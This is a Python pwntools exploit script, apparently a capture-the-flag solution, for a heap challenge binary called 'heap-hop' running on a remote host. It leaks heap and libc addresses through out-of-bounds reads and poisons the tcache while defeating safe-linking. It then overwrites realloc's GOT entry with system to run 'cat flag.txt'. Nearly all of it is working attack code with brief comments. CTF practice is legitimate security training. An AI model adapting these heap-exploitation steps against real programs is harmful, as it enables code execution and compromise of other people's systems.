#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host h --port 1234 heap-hop
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('heap-hop')
context.terminal = ['terminator','--new-tab','-x']
# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '51.254.39.184'
port = int(args.PORT or 1336)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
br handle_read
continue
c
c
c
heap chunks
heap bins
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)a

def prompt(cmd):
    io.sendlineafter(b'> ',cmd)

def cmd(i):
    prompt(str(i).encode())

def create(id_,name,size,content):
    cmd(1)
    cmd(id_)
    prompt(name)
    cmd(size)
    prompt(content)

def read(id_):
    cmd(2)
    cmd(id_)

def edit(id_,size,content):
    cmd(3)
    cmd(id_)
    cmd(size)
    prompt(content)

def fill_tcache():
    for i in range(7):
        create(i,b't',chk_size*2,b't'*chk_size*2)
        edit(i,chk_size,b'b'*chk_size)


libc = exe.libc
chk_size = 0x90 # > max fast bin chunk size

# setting up adeguate heap layout
io = start()
fill_tcache()
create(7,b'a',chk_size*2,b'a'*chk_size*2)
edit(7,chk_size,b'b'*chk_size) # because tcache is full, lower half of chunk is 'freed' and goes to unsorted bin
create(8,b'c'*32,32,b'd'*32) #  just below the bbbb... chunk

# heap leak by OOB reading on bbbb... chunk (used later for safe linking)
read(7)
io.recvline()
bh = io.recvline() + io.recvline()
print(f"bh : {bh}")
off = chk_size + 8 + 8 + 32 + 8
lk = bh[off:off+8]
print(lk)
heap_addr = int.from_bytes(lk,'little') - 0xdd0
print(f"heap : 0x{heap_addr:x}")

# libc leak by OOB writing and reading on bbbb... chunk
edit(7,chk_size,b'b'*(0xa0-8) +p64(0x40 | 1) + b'o'*32 + p64(0x20) + p64(exe.got['realloc']))
read(8)

io.recvline()
lk = io.recvline()[:8]
realloc_addr = int.from_bytes(lk,'little')
libc.address = realloc_addr - libc.symbols['realloc']
print(f"libc 0x{libc.address:x}")

# fixing chunk accordingly
edit(7,chk_size,bh[:-1])

# freeing chunk writable from OOB in  bbbb...
create(9,b'e'*32,32,b'f'*32) # prevent merging merging then reuse of dddd... chunk
create(10,b'g'*32,32,b'h'*32) # prevent merging merging then reuse of ffff... chunk
edit(9,64,b's'*32)
edit(8,64,b'r'*32) # tcache bin 0x30 holds 2 chunks, we'll replace the second

# overwriting fd pointer of tcache free list head to point into to the got at a 16-bytes aligned address
target = 0x404050 # address of the malloc got entry, which is aligned and just above realloc (target)
off = chk_size + 8 + 8 + 0x40
win = b'cat flag.txt\x00'
edit(7,chk_size,win + bh[len(win):off] + p64(target ^ (heap_addr >> 12) )) # xor for safe linking

# overwriting realloc got entry with system
create(11,b'i'*32,32,b'j'*32)
create(12,b'i'*32,32,p64(libc.symbols['malloc']) + p64(libc.symbols['system']) + p64(libc.symbols['scanf']) )
read(7)

# calling edit to call system('cat flag.txt')
edit(7,chk_size,b'deadbeef')

io.interactive()

